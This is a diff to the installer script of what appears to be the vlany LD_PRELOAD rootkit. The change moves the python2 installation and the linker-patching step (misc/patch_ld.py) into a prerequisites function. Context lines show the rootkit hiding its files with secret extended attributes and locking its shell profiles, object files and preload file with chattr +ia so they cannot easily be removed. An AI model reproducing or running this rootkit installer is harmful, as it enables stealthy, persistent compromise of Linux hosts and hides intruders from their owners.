@@ -42,6 +42,23 @@ install_vlany_prerequisites ()
         pacman -Syy &>/dev/null
         pacman -S --noconfirm attr pam openssl libpcap base-devel &>/dev/null
     fi
+    
+    echo "Installing python(2)"
+    if [ -f /usr/bin/yum ]; then
+        yes | yum install python2 &>/dev/null
+    elif [ -f /usr/bin/apt-get ]; then
+        yes | apt-get update &>/dev/null && sleep 1
+        apt-get --yes --force-yes install python &>/dev/null
+    elif [ -f /usr/bin/pacman ]; then
+        pacman -Syy &>/dev/null
+        pacman -S --noconfirm python2 &>/dev/null
+    fi
+
+    PYTHON_BIN=`which python2`
+    [ ! -f "$PYTHON_BIN" ] && { echo "$PYTHON_BIN was not found. Make sure python2 is installed."; exit; }
+
+    misc/patch_ld.py
+    NEW_PRELOAD=$(cat new_preload)
 }
 
 vlany_install_dialog ()
@@ -247,23 +264,6 @@ setup_vlany ()
     setfattr -n user.${HIDDEN_XATTR_1_STR} -v ${HIDDEN_XATTR_2_STR} $INSTALL $INSTALL/* $INSTALL/.profile $INSTALL/.bashrc $INSTALL/.shell_msg $INSTALL/.vlany_information
     chattr +ia $INSTALL/.profile $INSTALL/.bashrc $INSTALL/.shell_msg $INSTALL/.vlany_information $INSTALL/${OBJECT_FILE_NAME}* $NEW_PRELOAD
 }
-
-echo "Installing python(2)"
-if [ -f /usr/bin/yum ]; then
-    yes | yum install python2 &>/dev/null
-elif [ -f /usr/bin/apt-get ]; then
-    yes | apt-get update &>/dev/null && sleep 1
-    apt-get --yes --force-yes install python &>/dev/null
-elif [ -f /usr/bin/pacman ]; then
-    pacman -Syy &>/dev/null
-    pacman -S --noconfirm python2 &>/dev/null
-fi
-
-PYTHON_BIN=`which python2`
-[ ! -f "$PYTHON_BIN" ] && { echo "$PYTHON_BIN was not found. Make sure python2 is installed."; exit; }
-
-misc/patch_ld.py
-NEW_PRELOAD=$(cat new_preload)
 
 if [ "$1" == "--cli" ]; then
     echo "Installing vlany without a tui."
